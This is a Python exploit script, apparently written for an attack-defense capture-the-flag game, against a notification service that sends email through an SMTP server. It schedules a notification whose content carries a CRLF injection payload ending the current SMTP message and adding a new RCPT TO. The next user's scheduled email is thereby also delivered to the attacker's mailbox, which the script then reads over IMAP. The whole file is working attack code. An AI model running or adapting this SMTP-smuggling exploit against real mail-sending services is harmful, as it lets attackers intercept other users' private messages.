#!/usr/bin/env python3

import string
import sys
import time
from datetime import datetime, timedelta, timezone
from urllib.parse import urljoin

import checklib
import requests
from imap_tools.mailbox import MailBoxUnencrypted

API_PORT = 7777
IMAP_PORT = 143


def main(host: str, hint: str):
    API_URL = f"http://{host}:{API_PORT}"

    s = requests.session()

    # Register fresh new user
    username, password = checklib.rnd_string(
        10, string.ascii_lowercase
    ), checklib.rnd_password(10)
    print(f"Registering user {username}:{password}")

    r = s.post(
        urljoin(API_URL, "/register"), json={"username": username, "password": password}
    )
    assert r.status_code == 201, f"Registration failed ({r.status_code}): {r.text}"

    # Get public information about the notification, including its plan
    r = s.get(urljoin(API_URL, f"/notification/{hint}"))
    assert (
        r.status_code == 200
    ), f"Failed to get notification {hint} ({r.status_code}): {r.text}"

    # Find the next suitable planned send time at which we are going to plan our malicious notification
    notification_info = r.json()
    print(f"Notification {hint} info: {notification_info}\n")
    plan = notification_info["plan"]
    while len(plan) > 0 and (
        plan[0]["sent_at"] is not None
        or datetime.fromisoformat(plan[0]["planned_at"])
        < datetime.now(timezone.utc) + timedelta(seconds=5)
    ):
        plan = plan[1:]

    if len(plan) == 0:
        print(
            f"No suitable send time found, notification is probably too old and its whole plan has been completed"
        )
        return

    # Send payload with CRLF injection which will add us as a recipient of the next email,
    # since Stalwart doesn't close the connection on error,
    # and simply returns a non-ok status code, which isn't checked by the service.
    notify_at = datetime.fromisoformat(plan[0]["planned_at"]) - timedelta(
        microseconds=1
    )

    payload = (
        checklib.rnd_string(20, string.ascii_letters)
        + "\r\n.\r\n"
        + "MAIL FROM:<notifier@notify>\r\n"
        + f"RCPT TO:<{username}@notify>\r\n"
    )

    print(
        f"Creating notification to be sent at {notify_at.isoformat()} with payload:\n{payload}"
    )

    r = s.post(
        urljoin(API_URL, f"/notifications"),
        json={
            "title": checklib.rnd_string(30, string.ascii_letters),
            "content": payload,
            "notify_at": notify_at.isoformat(),
        },
    )
    assert (
        r.status_code == 201
    ), f"Failed to create attack notification ({r.status_code}): {r.text}"

    print(f"Attack notification id: {r.json()['notification_id']}")

    # Now wait until the notification arrives to our inbox
    time.sleep((notify_at - datetime.now(timezone.utc)).seconds + 2)

    with MailBoxUnencrypted(host=host, port=IMAP_PORT) as mailbox:
        mailbox.login(username, password)
        messages = list(mailbox.fetch())

    if len(messages) < 1:
        print(f"Exploitation failed, no messages arrived to the account's inbox")
        return

    for message in messages:
        print(f"Message {message.uid}:")
        print(message.obj)
        print("\n")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} [host] [hint]", file=sys.stderr)
        sys.exit(1)

    main(sys.argv[1], sys.argv[2])
